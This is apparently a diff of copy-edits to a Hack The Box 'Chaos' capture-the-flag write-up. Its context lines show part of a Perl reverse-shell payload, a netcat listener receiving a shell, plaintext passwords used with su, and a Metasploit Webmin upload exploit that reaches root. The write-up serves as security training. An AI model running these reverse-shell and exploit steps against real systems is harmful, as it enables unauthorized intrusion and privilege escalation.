@@ -233,7 +233,7 @@ Thanks,
 Ayush
 ```
 
-I removed the base64 encoded attachments from the snippet above that were also in the e-mail for the sake of space. The first attachment was a python script named "en.py" which looks to be an incomplete script that encrypts another file's contents and writes it to a new file. The second attachment contained what looked to be random / encrypted data. Mostly random data with an integer near where the magic bytes should be. 
+I removed the base64 encoded attachments from the snippet above that were also in the e-mail for the sake of space. The first attachment was a python script named "en.py" which looks to be an incomplete script that encrypts another file's contents and writes it to a new file. The second attachment contained what looked to be random / encrypted data. Mostly random data with an integer near where the magic bytes should be.
 
 Here's the incomplete python script we found in the e-mail:
 
@@ -268,7 +268,7 @@ def getKey(password):
             return hasher.digest()
 ```
 
-Simple enough, the method "getKey" takes in a string and returns a sha256 digest of that string. This is commonly used as a key for this type of AES encryption as the length requirements match perfectly. Next, the encrypt function takes in that same key and a filepath. We can now see what that integer in the encrypted file was the file's size that is to be encrypted + the IV used for encryption. The encrypt method takes chunks of the file passed in, 16 bytes at a time and encrypts them before writing them to a new file. Our next step is to write a decrypter.
+Simple enough, the method "getKey" takes in a string and returns a sha256 digest of that string. This is commonly used as a key for this type of AES encryption as the length requirements match perfectly. Next, the encrypt function takes in that same key and a filepath. We can now see that the integer in the encrypted file was the file's size that is to be encrypted + the IV used for encryption. The encrypt method takes chunks of the file passed in, 16 bytes at a time and encrypts them before writing them to a new file. Our next step is to write a decrypter.
 
 I've cleaned up the original code so it's functional and included a decrypt method. The only parameter we weren't given in the original python script is the password that is used to create the AES key. Referring back to the text in the e-mail:
 
@@ -448,7 +448,7 @@ open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'}
 Once I hit the Create PDF button, it works. I now have a shell on the machine:
 
 ```text
-~/ctf/htb/chaos λ nc -l -n -v -p 9002                                                                              gn0stic@kali
+~/ctf/htb/chaos λ nc -l -n -v -p 9002
 listening on [any] 9002 ...
 connect to [10.10.x.x] from (UNKNOWN) [10.10.10.120] 43736
 /bin/sh: 0: can't access tty; job control turned off
@@ -504,7 +504,7 @@ su -l ayush
 Password: jiujitsu
 ```
 
-The -l flag creates a login shell. This prevents loading of many environment variables and is enough for me to view the user flag:
+The -l flag creates a login shell. This prevents the loading of many environment variables and is enough for me to view the user flag:
 
 ```text
 ayush@chaos:~$ /bin/cat /home/ayush/user.txt
@@ -563,7 +563,7 @@ Password: 'Thiv8wrej~'
 ## Exploitation: 2
 One step closer. We go back to webmin and login to ensure the credentials work, they do. Now we have an authenticated session to the webmin service, which is all we need for the exploit we first found to work. The exploit is built for the metasploit framework, so let's start that up and setup the exploit:
 
-```
+```text
 ~/ctf/htb/chaos λ msfconsole
        =[ metasploit v5.0.23-dev                          ]
 + -- --=[ 1893 exploits - 1066 auxiliary - 329 post       ]
@@ -619,7 +619,7 @@ msf5 exploit(unix/webapp/webmin_upload_exec) > exploit
 
 Looks like the exploit worked! We have a command shell opened. Let's ensure we're root and get our flag to complete the exercise:
 
-```
+```text
 whoami
 root
 cat /root/root.txt
